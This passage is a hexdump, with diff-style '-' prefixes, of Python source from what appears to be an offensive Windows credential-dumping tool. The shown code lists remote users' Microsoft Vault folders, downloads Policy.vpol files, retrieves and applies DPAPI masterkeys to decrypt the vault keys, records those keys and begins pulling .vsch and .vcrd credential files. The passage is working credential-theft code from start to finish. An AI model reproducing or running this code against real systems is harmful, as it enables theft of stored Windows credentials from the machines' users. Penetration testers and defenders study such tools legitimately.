-0000a510: 2729 2c0a 0909 0909 0909 0920 2020 2822  '),........   ("
-0000a520: 5769 6e64 6f77 735c 5c73 7973 7465 6d33  Windows\\system3
-0000a530: 325c 5c63 6f6e 6669 675c 5c73 7973 7465  2\\config\\syste
-0000a540: 6d70 726f 6669 6c65 5c5c 4170 7044 6174  mprofile\\AppDat
-0000a550: 615c 5c4c 6f63 616c 5c5c 4d69 6372 6f73  a\\Local\\Micros
-0000a560: 6f66 745c 5c56 6175 6c74 5c5c 222c 2027  oft\\Vault\\", '
-0000a570: 2a27 2c0a 0909 0909 0909 0909 2776 6175  *',.........'vau
-0000a580: 6c74 272c 2027 4d41 4348 494e 4527 295d  lt', 'MACHINE')]
-0000a590: 2020 2320 5769 6e64 6f77 7320 6865 6c6c    # Windows hell
-0000a5a0: 6f20 7069 6e63 6f64 650a 0a09 0966 6f72  o pincode....for
-0000a5b0: 2075 7365 7220 696e 2073 656c 662e 7573   user in self.us
-0000a5c0: 6572 733a 0a09 0909 6966 2075 7365 722e  ers:....if user.
-0000a5d0: 7573 6572 6e61 6d65 203d 3d20 274d 4143  username == 'MAC
-0000a5e0: 4849 4e45 2427 3a0a 0909 0909 6469 7265  HINE$':.....dire
-0000a5f0: 6374 6f72 6965 735f 746f 5f75 7365 203d  ctories_to_use =
-0000a600: 206d 6163 6869 6e65 5f64 6972 6563 746f   machine_directo
-0000a610: 7269 6573 0a09 0909 656c 7365 3a0a 0909  ries....else:...
-0000a620: 0909 6469 7265 6374 6f72 6965 735f 746f  ..directories_to
-0000a630: 5f75 7365 203d 2075 7365 725f 6469 7265  _use = user_dire
-0000a640: 6374 6f72 6965 730a 0a09 0909 6966 206c  ctories.....if l
-0000a650: 656e 2875 7365 722e 6d61 7374 6572 6b65  en(user.masterke
-0000a660: 7973 5f66 696c 6529 203e 2030 3a20 2023  ys_file) > 0:  #
-0000a670: 2050 6173 2064 6520 6d61 7374 6572 6b65   Pas de masterke
-0000a680: 7973 3d3d 7061 7320 6465 2064 6174 6173  ys==pas de datas
-0000a690: 2061 2072 6563 7570 0a09 0909 0966 6f72   a recup.....for
-0000a6a0: 2069 6e66 6f20 696e 2064 6972 6563 746f   info in directo
-0000a6b0: 7269 6573 5f74 6f5f 7573 653a 0a09 0909  ries_to_use:....
-0000a6c0: 0909 6d79 5f64 6972 2c20 6d79 5f6d 6173  ..my_dir, my_mas
-0000a6d0: 6b2c 206d 795f 626c 6f62 5f74 7970 652c  k, my_blob_type,
-0000a6e0: 206d 795f 7573 6572 5f74 7970 6520 3d20   my_user_type = 
-0000a6f0: 696e 666f 0a09 0909 0909 746d 705f 7077  info......tmp_pw
-0000a700: 6420 3d20 6d79 5f64 6972 2e66 6f72 6d61  d = my_dir.forma
-0000a710: 7428 0a09 0909 0909 0975 7365 726e 616d  t(.......usernam
-0000a720: 653d 7573 6572 2e75 7365 726e 616d 6529  e=user.username)
-0000a730: 2020 2320 6622 5573 6572 735c 5c7b 7573    # f"Users\\{us
-0000a740: 6572 2e75 7365 726e 616d 657d 5c5c 7b6d  er.username}\\{m
-0000a750: 795f 6469 727d 2223 6e74 7061 7468 2e6a  y_dir}"#ntpath.j
-0000a760: 6f69 6e28 6e74 7061 7468 2e6a 6f69 6e28  oin(ntpath.join(
-0000a770: 2755 7365 7273 272c 2075 7365 722e 7573  'Users', user.us
-0000a780: 6572 6e61 6d65 292c 206d 795f 6469 7229  ername), my_dir)
-0000a790: 0a09 0909 0909 7365 6c66 2e6c 6f67 6769  ......self.loggi
-0000a7a0: 6e67 2e64 6562 7567 2822 4c6f 6f6b 696e  ng.debug("Lookin
-0000a7b0: 6720 666f 7220 2573 2056 6175 6c74 7320  g for %s Vaults 
-0000a7c0: 696e 2025 7320 7769 7468 206d 6173 6b20  in %s with mask 
-0000a7d0: 2573 2220 2520 2875 7365 722e 7573 6572  %s" % (user.user
-0000a7e0: 6e61 6d65 2c20 746d 705f 7077 642c 206d  name, tmp_pwd, m
-0000a7f0: 795f 6d61 736b 2929 0a09 0909 0909 6d79  y_mask))......my
-0000a800: 5f64 6972 6563 746f 7279 203d 2073 656c  _directory = sel
-0000a810: 662e 6d79 6669 6c65 6f70 732e 646f 5f6c  f.myfileops.do_l
-0000a820: 7328 746d 705f 7077 642c 206d 795f 6d61  s(tmp_pwd, my_ma
-0000a830: 736b 2c20 6469 7370 6c61 793d 4661 6c73  sk, display=Fals
-0000a840: 6529 0a09 0909 0909 666f 7220 696e 666f  e)......for info
-0000a850: 7320 696e 206d 795f 6469 7265 6374 6f72  s in my_director
-0000a860: 793a 0a09 0909 0909 096c 6f6e 676e 616d  y:.......longnam
-0000a870: 652c 2069 735f 6469 7265 6374 6f72 7920  e, is_directory 
-0000a880: 3d20 696e 666f 730a 0909 0909 0909 7365  = infos.......se
-0000a890: 6c66 2e6c 6f67 6769 6e67 2e64 6562 7567  lf.logging.debug
-0000a8a0: 2822 6c73 2072 6574 7572 6e65 6420 2573  ("ls returned %s
-0000a8b0: 2220 2520 6c6f 6e67 6e61 6d65 290a 0909  " % longname)...
-0000a8c0: 0909 0909 6966 206c 6f6e 676e 616d 6520  ....if longname 
-0000a8d0: 6e6f 7420 696e 2062 6c61 636b 6c69 7374  not in blacklist
-0000a8e0: 2061 6e64 2069 735f 6469 7265 6374 6f72   and is_director
-0000a8f0: 793a 0a09 0909 0909 0909 7365 6c66 2e6c  y:........self.l
-0000a900: 6f67 6769 6e67 2e64 6562 7567 2822 476f  ogging.debug("Go
-0000a910: 7420 5661 756c 7420 4469 7265 6374 6f72  t Vault Director
-0000a920: 7920 2573 2220 2520 6c6f 6e67 6e61 6d65  y %s" % longname
-0000a930: 290a 0909 0909 0909 0974 6d70 5f70 7764  )........tmp_pwd
-0000a940: 3220 3d20 6e74 7061 7468 2e6a 6f69 6e28  2 = ntpath.join(
-0000a950: 746d 705f 7077 642c 206c 6f6e 676e 616d  tmp_pwd, longnam
-0000a960: 6529 0a09 0909 0909 0909 7472 793a 0a09  e)........try:..
-0000a970: 0909 0909 0909 0923 2046 6972 7374 2067  .......# First g
-0000a980: 6574 2074 6865 2050 6f6c 6963 792e 7670  et the Policy.vp
-0000a990: 6f6c 0a09 0909 0909 0909 096c 6f63 616c  ol.........local
-0000a9a0: 5f76 706f 6c5f 6669 6c65 203d 2073 656c  _vpol_file = sel
-0000a9b0: 662e 6d79 6669 6c65 6f70 732e 6765 745f  f.myfileops.get_
-0000a9c0: 6669 6c65 286e 7470 6174 682e 6a6f 696e  file(ntpath.join
-0000a9d0: 2874 6d70 5f70 7764 322c 2022 506f 6c69  (tmp_pwd2, "Poli
-0000a9e0: 6379 2e76 706f 6c22 2929 0a09 0909 0909  cy.vpol"))......
-0000a9f0: 0909 0975 7365 722e 6669 6c65 735b 6c6f  ...user.files[lo
-0000aa00: 6e67 6e61 6d65 5d20 3d20 7b7d 0a09 0909  ngname] = {}....
-0000aa10: 0909 0909 0975 7365 722e 6669 6c65 735b  .....user.files[
-0000aa20: 6c6f 6e67 6e61 6d65 5d5b 2774 7970 6527  longname]['type'
-0000aa30: 5d20 3d20 6d79 5f62 6c6f 625f 7479 7065  ] = my_blob_type
-0000aa40: 0a09 0909 0909 0909 0975 7365 722e 6669  .........user.fi
-0000aa50: 6c65 735b 6c6f 6e67 6e61 6d65 5d5b 2773  les[longname]['s
-0000aa60: 7461 7475 7327 5d20 3d20 2765 6e63 7279  tatus'] = 'encry
-0000aa70: 7074 6564 270a 0909 0909 0909 0909 7573  pted'.........us
-0000aa80: 6572 2e66 696c 6573 5b6c 6f6e 676e 616d  er.files[longnam
-0000aa90: 655d 5b27 5549 4427 5d20 3d20 6c6f 6e67  e]['UID'] = long
-0000aaa0: 6e61 6d65 0a09 0909 0909 0909 0975 7365  name.........use
-0000aab0: 722e 6669 6c65 735b 6c6f 6e67 6e61 6d65  r.files[longname
-0000aac0: 5d5b 2770 6174 6827 5d20 3d20 746d 705f  ]['path'] = tmp_
-0000aad0: 7077 6432 0a09 0909 0909 0909 0975 7365  pwd2.........use
-0000aae0: 722e 6669 6c65 735b 6c6f 6e67 6e61 6d65  r.files[longname
-0000aaf0: 5d5b 2776 706f 6c5f 7061 7468 275d 203d  ]['vpol_path'] =
-0000ab00: 206c 6f63 616c 5f76 706f 6c5f 6669 6c65   local_vpol_file
-0000ab10: 0a09 0909 0909 0909 0975 7365 722e 6669  .........user.fi
-0000ab20: 6c65 735b 6c6f 6e67 6e61 6d65 5d5b 2776  les[longname]['v
-0000ab30: 706f 6c5f 7374 6174 7573 275d 203d 2027  pol_status'] = '
-0000ab40: 656e 6372 7970 7465 6427 0a09 0909 0909  encrypted'......
-0000ab50: 0909 0975 7365 722e 6669 6c65 735b 6c6f  ...user.files[lo
-0000ab60: 6e67 6e61 6d65 5d5b 2776 7363 6827 5d20  ngname]['vsch'] 
-0000ab70: 3d20 7b7d 0a09 0909 0909 0909 0975 7365  = {}.........use
-0000ab80: 722e 6669 6c65 735b 6c6f 6e67 6e61 6d65  r.files[longname
-0000ab90: 5d5b 2776 6372 6427 5d20 3d20 7b7d 0a09  ]['vcrd'] = {}..
-0000aba0: 0909 0909 0909 0975 7365 722e 6669 6c65  .......user.file
-0000abb0: 735b 6c6f 6e67 6e61 6d65 5d5b 2764 6174  s[longname]['dat
-0000abc0: 6127 5d20 3d20 2727 0a09 0909 0909 0909  a'] = ''........
-0000abd0: 0923 2044 6563 7279 7074 2074 6865 206b  .# Decrypt the k
-0000abe0: 6579 730a 0a09 0909 0909 0909 096d 796f  eys..........myo
-0000abf0: 7074 696f 6e73 203d 2063 6f70 792e 6465  ptions = copy.de
-0000ac00: 6570 636f 7079 2873 656c 662e 6f70 7469  epcopy(self.opti
-0000ac10: 6f6e 7329 0a09 0909 0909 0909 096d 796f  ons).........myo
-0000ac20: 7074 696f 6e73 2e76 6372 6420 3d20 4e6f  ptions.vcrd = No
-0000ac30: 6e65 2020 2320 5661 756c 7420 4669 6c65  ne  # Vault File
-0000ac40: 2074 6f20 7061 7273 650a 0909 0909 0909   to parse.......
-0000ac50: 0909 6d79 6f70 7469 6f6e 732e 6d61 7374  ..myoptions.mast
-0000ac60: 6572 6b65 7973 203d 204e 6f6e 650a 0909  erkeys = None...
-0000ac70: 0909 0909 0909 6d79 6f70 7469 6f6e 732e  ......myoptions.
-0000ac80: 7670 6f6c 203d 206c 6f63 616c 5f76 706f  vpol = local_vpo
-0000ac90: 6c5f 6669 6c65 0a09 0909 0909 0909 096d  l_file.........m
-0000aca0: 796f 7074 696f 6e73 2e6b 6579 203d 204e  yoptions.key = N
-0000acb0: 6f6e 650a 0909 0909 0909 0909 6d79 6470  one.........mydp
-0000acc0: 6170 6920 3d20 4450 4150 4928 6d79 6f70  api = DPAPI(myop
-0000acd0: 7469 6f6e 732c 2073 656c 662e 6c6f 6767  tions, self.logg
-0000ace0: 696e 6729 0a09 0909 0909 0909 0967 7569  ing).........gui
-0000acf0: 6420 3d20 6d79 6470 6170 692e 6669 6e64  d = mydpapi.find
-0000ad00: 5f56 6175 6c74 5f4d 6173 7465 726b 6579  _Vault_Masterkey
-0000ad10: 2829 0a09 0909 0909 0909 0969 6620 6775  ().........if gu
-0000ad20: 6964 2021 3d20 4e6f 6e65 3a0a 0909 0909  id != None:.....
-0000ad30: 0909 0909 096d 6173 7465 726b 6579 203d  .....masterkey =
-0000ad40: 2073 656c 662e 6765 745f 6d61 7374 6572   self.get_master
-0000ad50: 6b65 7928 7573 6572 3d75 7365 722c 2067  key(user=user, g
-0000ad60: 7569 643d 6775 6964 2c20 7479 7065 3d6d  uid=guid, type=m
-0000ad70: 795f 7573 6572 5f74 7970 6529 0a09 0909  y_user_type)....
-0000ad80: 0909 0909 0909 6966 206d 6173 7465 726b  ......if masterk
-0000ad90: 6579 2021 3d20 4e6f 6e65 3a0a 0909 0909  ey != None:.....
-0000ada0: 0909 0909 0909 6966 206d 6173 7465 726b  ......if masterk
-0000adb0: 6579 5b27 7374 6174 7573 275d 203d 3d20  ey['status'] == 
-0000adc0: 2764 6563 7279 7074 6564 273a 0a09 0909  'decrypted':....
-0000add0: 0909 0909 0909 0909 6d79 6470 6170 692e  ........mydpapi.
-0000ade0: 6f70 7469 6f6e 732e 6b65 7920 3d20 6d61  options.key = ma
-0000adf0: 7374 6572 6b65 795b 276b 6579 275d 0a09  sterkey['key']..
-0000ae00: 0909 0909 0909 0909 0909 6b65 7973 203d  ..........keys =
-0000ae10: 206d 7964 7061 7069 2e64 6563 7279 7074   mydpapi.decrypt
-0000ae20: 5f76 6175 6c74 2829 0a09 0909 0909 0909  _vault()........
-0000ae30: 0909 0909 6966 206b 6579 7320 213d 204e  ....if keys != N
-0000ae40: 6f6e 653a 0a09 0909 0909 0909 0909 0909  one:............
-0000ae50: 0973 656c 662e 6c6f 6767 696e 672e 6465  .self.logging.de
-0000ae60: 6275 6728 0a09 0909 0909 0909 0909 0909  bug(............
-0000ae70: 0909 6622 5b7b 7365 6c66 2e6f 7074 696f  ..f"[{self.optio
-0000ae80: 6e73 2e74 6172 6765 745f 6970 7d5d 207b  ns.target_ip}] {
-0000ae90: 6263 6f6c 6f72 732e 4f4b 4752 4545 4e7d  bcolors.OKGREEN}
-0000aea0: 5661 756c 7420 506f 6c69 6379 2066 696c  Vault Policy fil
-0000aeb0: 6520 4465 6372 7970 7469 6f6e 2073 7563  e Decryption suc
-0000aec0: 6365 7373 6675 6c6c 202d 207b 6c6f 6361  cessfull - {loca
-0000aed0: 6c5f 7670 6f6c 5f66 696c 657d 7b62 636f  l_vpol_file}{bco
-0000aee0: 6c6f 7273 2e45 4e44 437d 2229 0a09 0909  lors.ENDC}")....
-0000aef0: 0909 0909 0909 0909 0974 6d70 5f76 6175  .........tmp_vau
-0000af00: 6c74 6b65 7973 203d 205b 5d0a 0909 0909  ltkeys = [].....
-0000af10: 0909 0909 0909 0909 6966 206b 6579 735b  ........if keys[
-0000af20: 274b 6579 3127 5d5b 2753 697a 6527 5d20  'Key1']['Size'] 
-0000af30: 3e20 3078 3234 3a0a 0909 0909 0909 0909  > 0x24:.........
-0000af40: 0909 0909 0974 6d70 5f76 6175 6c74 6b65  .....tmp_vaultke
-0000af50: 7973 2e61 7070 656e 6428 0a09 0909 0909  ys.append(......
-0000af60: 0909 0909 0909 0909 0927 3078 2573 2720  .........'0x%s' 
-0000af70: 2520 6269 6e61 7363 6969 2e68 6578 6c69  % binascii.hexli
-0000af80: 6679 286b 6579 735b 274b 6579 3227 5d5b  fy(keys['Key2'][
-0000af90: 2762 4b65 7942 6c6f 6227 5d29 290a 0909  'bKeyBlob']))...
-0000afa0: 0909 0909 0909 0909 0909 0974 6d70 5f76  ...........tmp_v
-0000afb0: 6175 6c74 6b65 7973 2e61 7070 656e 6428  aultkeys.append(
-0000afc0: 0a09 0909 0909 0909 0909 0909 0909 0927  ...............'
-0000afd0: 3078 2573 2720 2520 6269 6e61 7363 6969  0x%s' % binascii
-0000afe0: 2e68 6578 6c69 6679 286b 6579 735b 274b  .hexlify(keys['K
-0000aff0: 6579 3127 5d5b 2762 4b65 7942 6c6f 6227  ey1']['bKeyBlob'
-0000b000: 5d29 290a 0909 0909 0909 0909 0909 0909  ])).............
-0000b010: 656c 7365 3a0a 0909 0909 0909 0909 0909  else:...........
-0000b020: 0909 0974 6d70 5f76 6175 6c74 6b65 7973  ...tmp_vaultkeys
-0000b030: 2e61 7070 656e 6428 0a09 0909 0909 0909  .append(........
-0000b040: 0909 0909 0909 0927 3078 2573 2720 2520  .......'0x%s' % 
-0000b050: 6269 6e61 7363 6969 2e68 6578 6c69 6679  binascii.hexlify
-0000b060: 280a 0909 0909 0909 0909 0909 0909 0909  (...............
-0000b070: 096b 6579 735b 274b 6579 3227 5d5b 2762  .keys['Key2']['b
-0000b080: 4b65 7942 6c6f 6227 5d5b 2762 4b65 7927  KeyBlob']['bKey'
-0000b090: 5d29 2e64 6563 6f64 6528 276c 6174 696e  ]).decode('latin
-0000b0a0: 2d31 2729 290a 0909 0909 0909 0909 0909  -1'))...........
-0000b0b0: 0909 0974 6d70 5f76 6175 6c74 6b65 7973  ...tmp_vaultkeys
-0000b0c0: 2e61 7070 656e 6428 0a09 0909 0909 0909  .append(........
-0000b0d0: 0909 0909 0909 0927 3078 2573 2720 2520  .......'0x%s' % 
-0000b0e0: 6269 6e61 7363 6969 2e68 6578 6c69 6679  binascii.hexlify
-0000b0f0: 280a 0909 0909 0909 0909 0909 0909 0909  (...............
-0000b100: 096b 6579 735b 274b 6579 3127 5d5b 2762  .keys['Key1']['b
-0000b110: 4b65 7942 6c6f 6227 5d5b 2762 4b65 7927  KeyBlob']['bKey'
-0000b120: 5d29 2e64 6563 6f64 6528 276c 6174 696e  ]).decode('latin
-0000b130: 2d31 2729 290a 0909 0909 0909 0909 0909  -1'))...........
-0000b140: 0909 7365 6c66 2e6c 6f67 6769 6e67 2e64  ..self.logging.d
-0000b150: 6562 7567 280a 0909 0909 0909 0909 0909  ebug(...........
-0000b160: 0909 0966 225b 7b73 656c 662e 6f70 7469  ...f"[{self.opti
-0000b170: 6f6e 732e 7461 7267 6574 5f69 707d 5d20  ons.target_ip}] 
-0000b180: 5361 7669 6e67 207b 6c65 6e28 746d 705f  Saving {len(tmp_
-0000b190: 7661 756c 746b 6579 7329 7d20 5661 756c  vaultkeys)} Vaul
-0000b1a0: 7420 6b65 7973 207b 6263 6f6c 6f72 732e  t keys {bcolors.
-0000b1b0: 454e 4443 7d22 290a 0909 0909 0909 0909  ENDC}").........
-0000b1c0: 0909 0909 7573 6572 2e66 696c 6573 5b6c  ....user.files[l
-0000b1d0: 6f6e 676e 616d 655d 5b27 7670 6f6c 5f73  ongname]['vpol_s
-0000b1e0: 7461 7475 7327 5d20 3d20 2764 6563 7279  tatus'] = 'decry
-0000b1f0: 7074 6564 270a 0909 0909 0909 0909 0909  pted'...........
-0000b200: 0909 7573 6572 2e66 696c 6573 5b6c 6f6e  ..user.files[lon
-0000b210: 676e 616d 655d 5b27 7374 6174 7573 275d  gname]['status']
-0000b220: 203d 2027 6465 6372 7970 7465 6427 0a09   = 'decrypted'..
-0000b230: 0909 0909 0909 0909 0909 0975 7365 722e  ...........user.
-0000b240: 6669 6c65 735b 6c6f 6e67 6e61 6d65 5d5b  files[longname][
-0000b250: 2764 6174 6127 5d20 3d20 746d 705f 7661  'data'] = tmp_va
-0000b260: 756c 746b 6579 730a 0909 0909 0909 0909  ultkeys.........
-0000b270: 0909 0965 6c73 653a 0a09 0909 0909 0909  ...else:........
-0000b280: 0909 0909 0973 656c 662e 6c6f 6767 696e  .....self.loggin
-0000b290: 672e 6465 6275 6728 0a09 0909 0909 0909  g.debug(........
-0000b2a0: 0909 0909 0909 6622 5b7b 7365 6c66 2e6f  ......f"[{self.o
-0000b2b0: 7074 696f 6e73 2e74 6172 6765 745f 6970  ptions.target_ip
-0000b2c0: 7d5d 207b 6263 6f6c 6f72 732e 5741 524e  }] {bcolors.WARN
-0000b2d0: 494e 477d 4572 726f 7220 6465 6372 7970  ING}Error decryp
-0000b2e0: 7469 6e67 2050 6f6c 6963 792e 7670 6f6c  ting Policy.vpol
-0000b2f0: 207b 6c6f 6361 6c5f 7670 6f6c 5f66 696c   {local_vpol_fil
-0000b300: 657d 2077 6974 6820 4d61 7374 6572 6b65  e} with Masterke
-0000b310: 797b 6263 6f6c 6f72 732e 454e 4443 7d22  y{bcolors.ENDC}"
-0000b320: 290a 0909 0909 0909 0909 0909 0909 636f  ).............co
-0000b330: 6e74 696e 7565 0a09 0909 0909 0909 0909  ntinue..........
-0000b340: 0965 6c73 653a 0a09 0909 0909 0909 0909  .else:..........
-0000b350: 0909 7365 6c66 2e6c 6f67 6769 6e67 2e64  ..self.logging.d
-0000b360: 6562 7567 280a 0909 0909 0909 0909 0909  ebug(...........
-0000b370: 0909 6622 5b7b 7365 6c66 2e6f 7074 696f  ..f"[{self.optio
-0000b380: 6e73 2e74 6172 6765 745f 6970 7d5d 207b  ns.target_ip}] {
-0000b390: 6263 6f6c 6f72 732e 5741 524e 494e 477d  bcolors.WARNING}
-0000b3a0: 4572 726f 7220 6465 6372 7970 7469 6e67  Error decrypting
-0000b3b0: 2050 6f6c 6963 792e 7670 6f6c 207b 6c6f   Policy.vpol {lo
-0000b3c0: 6361 6c5f 7670 6f6c 5f66 696c 657d 2077  cal_vpol_file} w
-0000b3d0: 6974 6820 4d61 7374 6572 6b65 7920 2d20  ith Masterkey - 
-0000b3e0: 4d61 7374 6572 6b65 7920 6e6f 7420 6465  Masterkey not de
-0000b3f0: 6372 7970 7465 647b 6263 6f6c 6f72 732e  crypted{bcolors.
-0000b400: 454e 4443 7d22 290a 0909 0909 0909 0909  ENDC}").........
-0000b410: 0909 0963 6f6e 7469 6e75 650a 0909 0909  ...continue.....
-0000b420: 0909 0909 0965 6c73 653a 0a09 0909 0909  .....else:......
-0000b430: 0909 0909 0973 656c 662e 6c6f 6767 696e  .....self.loggin
-0000b440: 672e 6465 6275 6728 0a09 0909 0909 0909  g.debug(........
-0000b450: 0909 0909 6622 5b7b 7365 6c66 2e6f 7074  ....f"[{self.opt
-0000b460: 696f 6e73 2e74 6172 6765 745f 6970 7d5d  ions.target_ip}]
-0000b470: 207b 6263 6f6c 6f72 732e 5741 524e 494e   {bcolors.WARNIN
-0000b480: 477d 4572 726f 7220 6465 6372 7970 7469  G}Error decrypti
-0000b490: 6e67 2050 6f6c 6963 792e 7670 6f6c 207b  ng Policy.vpol {
-0000b4a0: 6c6f 6361 6c5f 7670 6f6c 5f66 696c 657d  local_vpol_file}
-0000b4b0: 2077 6974 6820 4d61 7374 6572 6b65 792d   with Masterkey-
-0000b4c0: 2063 616e 7420 6765 7420 6d61 7374 6572   cant get master
-0000b4d0: 6b65 7920 7b67 7569 647d 7b62 636f 6c6f  key {guid}{bcolo
-0000b4e0: 7273 2e45 4e44 437d 2229 0a09 0909 0909  rs.ENDC}")......
-0000b4f0: 0909 0909 0963 6f6e 7469 6e75 650a 0909  .....continue...
-0000b500: 0909 0909 0909 656c 7365 3a0a 0909 0909  ......else:.....
-0000b510: 0909 0909 0973 656c 662e 6c6f 6767 696e  .....self.loggin
-0000b520: 672e 6465 6275 6728 0a09 0909 0909 0909  g.debug(........
-0000b530: 0909 0966 225b 7b73 656c 662e 6f70 7469  ...f"[{self.opti
-0000b540: 6f6e 732e 7461 7267 6574 5f69 707d 5d20  ons.target_ip}] 
-0000b550: 7b62 636f 6c6f 7273 2e57 4152 4e49 4e47  {bcolors.WARNING
-0000b560: 7d45 7272 6f72 2064 6563 7279 7074 696e  }Error decryptin
-0000b570: 6720 506f 6c69 6379 2e76 706f 6c20 7b6c  g Policy.vpol {l
-0000b580: 6f63 616c 5f76 706f 6c5f 6669 6c65 7d20  ocal_vpol_file} 
-0000b590: 7769 7468 204d 6173 7465 726b 6579 202d  with Masterkey -
-0000b5a0: 2063 616e 2074 2067 6574 2074 6865 2047   can t get the G
-0000b5b0: 5549 4420 6f66 206d 6173 7465 726b 6579  UID of masterkey
-0000b5c0: 2066 726f 6d20 626c 6f62 2066 696c 657b   from blob file{
-0000b5d0: 6263 6f6c 6f72 732e 454e 4443 7d22 290a  bcolors.ENDC}").
-0000b5e0: 0909 0909 0909 0909 0963 6f6e 7469 6e75  .........continu
-0000b5f0: 650a 0a09 0909 0909 0909 6578 6365 7074  e.........except
-0000b600: 2045 7863 6570 7469 6f6e 2061 7320 6578   Exception as ex
-0000b610: 3a0a 0909 0909 0909 0909 7365 6c66 2e6c  :.........self.l
-0000b620: 6f67 6769 6e67 2e64 6562 7567 280a 0909  ogging.debug(...
-0000b630: 0909 0909 0909 0966 225b 7b73 656c 662e  .......f"[{self.
-0000b640: 6f70 7469 6f6e 732e 7461 7267 6574 5f69  options.target_i
-0000b650: 707d 5d20 7b62 636f 6c6f 7273 2e57 4152  p}] {bcolors.WAR
-0000b660: 4e49 4e47 7d45 7863 6570 7469 6f6e 2064  NING}Exception d
-0000b670: 6563 7279 7074 696e 6720 506f 6c69 6379  ecrypting Policy
-0000b680: 2e76 706f 6c20 7b6c 6f63 616c 5f76 706f  .vpol {local_vpo
-0000b690: 6c5f 6669 6c65 7d20 7769 7468 204d 6173  l_file} with Mas
-0000b6a0: 7465 726b 6579 7b62 636f 6c6f 7273 2e45  terkey{bcolors.E
-0000b6b0: 4e44 437d 2229 0a09 0909 0909 0909 0973  NDC}").........s
-0000b6c0: 656c 662e 6c6f 6767 696e 672e 6465 6275  elf.logging.debu
-0000b6d0: 6728 6578 290a 0909 0909 0909 0909 636f  g(ex).........co
-0000b6e0: 6e74 696e 7565 0a0a 0909 0909 0909 0923  ntinue.........#
-0000b6f0: 204c 6f6f 6b20 666f 7220 2e76 7363 6820   Look for .vsch 
-0000b700: 3a20 5661 756c 7420 5363 6865 6d61 2066  : Vault Schema f
-0000b710: 696c 650a 0a09 0909 0909 0909 2320 5468  ile.........# Th
-0000b720: 656e 2067 6574 7320 2a2e 7663 7264 2066  en gets *.vcrd f
-0000b730: 696c 6573 0a09 0909 0909 0909 6d79 5f64  iles........my_d
-0000b740: 6972 6563 746f 7279 3220 3d20 7365 6c66  irectory2 = self
-0000b750: 2e6d 7966 696c 656f 7073 2e64 6f5f 6c73  .myfileops.do_ls
-0000b760: 2874 6d70 5f70 7764 322c 206d 795f 6d61  (tmp_pwd2, my_ma
-0000b770: 736b 2c20 6469 7370 6c61 793d 4661 6c73  sk, display=Fals
-0000b780: 6529 0a09 0909 0909 0909 7365 6c66 2e6c  e)........self.l
-0000b790: 6f67 6769 6e67 2e64 6562 7567 280a 0909  ogging.debug(...
-0000b7a0: 0909 0909 0909 6622 5b7b 7365 6c66 2e6f  ......f"[{self.o
-0000b7b0: 7074 696f 6e73 2e74 6172 6765 745f 6970  ptions.target_ip
-0000b7c0: 7d5d 2046 6f75 6e64 207b 6c65 6e28 6d79  }] Found {len(my
-0000b7d0: 5f64 6972 6563 746f 7279 3229 7d20 6669  _directory2)} fi
-0000b7e0: 6c65 7320 696e 207b 746d 705f 7077 6432  les in {tmp_pwd2
-0000b7f0: 7d22 290a 0909 0909 0909 0966 6f72 2069  }")........for i
-0000b800: 6e66 6f73 3220 696e 206d 795f 6469 7265  nfos2 in my_dire
-0000b810: 6374 6f72 7932 3a0a 0909 0909 0909 0909  ctory2:.........
-0000b820: 6c6f 6e67 6e61 6d65 322c 2069 735f 6469  longname2, is_di
-0000b830: 7265 6374 6f72 7932 203d 2069 6e66 6f73  rectory2 = infos
-0000b840: 320a 0909 0909 0909 0909 7365 6c66 2e6c  2.........self.l
-0000b850: 6f67 6769 6e67 2e64 6562 7567 2822 6c73  ogging.debug("ls
-0000b860: 2072 6574 7572 6e65 6420 6669 6c65 2025   returned file %
-0000b870: 7322 2025 206c 6f6e 676e 616d 6532 290a  s" % longname2).
-0000b880: 0909 0909 0909 0909 6966 206c 6f6e 676e  ........if longn
-0000b890: 616d 6532 206e 6f74 2069 6e20 626c 6163  ame2 not in blac
-0000b8a0: 6b6c 6973 7420 616e 6420 6e6f 7420 6973  klist and not is
-0000b8b0: 5f64 6972 6563 746f 7279 3220 616e 6420  _directory2 and 
-0000b8c0: 6e6f 7420 6c6f 6e67 6e61 6d65 3220 3d3d  not longname2 ==
-0000b8d0: 2022 506f 6c69 6379 2e76 706f 6c22 3a0a   "Policy.vpol":.
-0000b8e0: 0909 0909 0909 0909 0974 7279 3a0a 0909  .........try:...
-0000b8f0: 0909 0909 0909 0909 2320 446f 776e 6c6f  ........# Downlo
-0000b900: 6164 696e 6720 426c 6f62 2066 696c 650a  ading Blob file.
-0000b910: 0909 0909 0909 0909 0909 6c6f 6361 6c66  ..........localf
-0000b920: 696c 6520 3d20 7365 6c66 2e6d 7966 696c  ile = self.myfil
-0000b930: 656f 7073 2e67 6574 5f66 696c 6528 6e74  eops.get_file(nt
-0000b940: 7061 7468 2e6a 6f69 6e28 746d 705f 7077  path.join(tmp_pw
-0000b950: 6432 2c20 6c6f 6e67 6e61 6d65 3229 290a  d2, longname2)).
-0000b960: 0909 0909 0909 0909 0909 6966 206c 6f6e  ..........if lon
-0000b970: 676e 616d 6532 5b2d 343a 5d20 3d3d 2027  gname2[-4:] == '
-0000b980: 7673 6368 273a 2020 2320 5041 5320 4732  vsch':  # PAS G2
-0000b990: 5232 2070 6f75 7220 6c65 206d 6f6d 656e  R2 pour le momen
-0000b9a0: 740a 0909 0909 0909 0909 0909 0975 7365  t............use
-0000b9b0: 722e 6669 6c65 735b 6c6f 6e67 6e61 6d65  r.files[longname
-0000b9c0: 5d5b 2776 7363 6827 5d5b 6c6f 6361 6c66  ]['vsch'][localf
-0000b9d0: 696c 655d 203d 207b 7d0a 0909 0909 0909  ile] = {}.......
-0000b9e0: 0909 0909 0975 7365 722e 6669 6c65 735b  .....user.files[
-0000b9f0: 6c6f 6e67 6e61 6d65 5d5b 2776 7363 6827  longname]['vsch'
-0000ba00: 5d5b 6c6f 6361 6c66 696c 655d 5b27 7374  ][localfile]['st
-0000ba10: 6174 7573 275d 203d 2027 656e 6372 7970  atus'] = 'encryp
-0000ba20: 7465 6427 0a09 0909 0909 0909 0909 0909  ted'............
-0000ba30: 7573 6572 2e66 696c 6573 5b6c 6f6e 676e  user.files[longn
-0000ba40: 616d 655d 5b27 7673 6368 275d 5b6c 6f63  ame]['vsch'][loc
-0000ba50: 616c 6669 6c65 5d5b 2774 7970 6527 5d20  alfile]['type'] 
-0000ba60: 3d20 2776 7363 6827 0a09 0909 0909 0909  = 'vsch'........
-0000ba70: 0909 0909 7573 6572 2e66 696c 6573 5b6c  ....user.files[l
-0000ba80: 6f6e 676e 616d 655d 5b27 7673 6368 275d  ongname]['vsch']
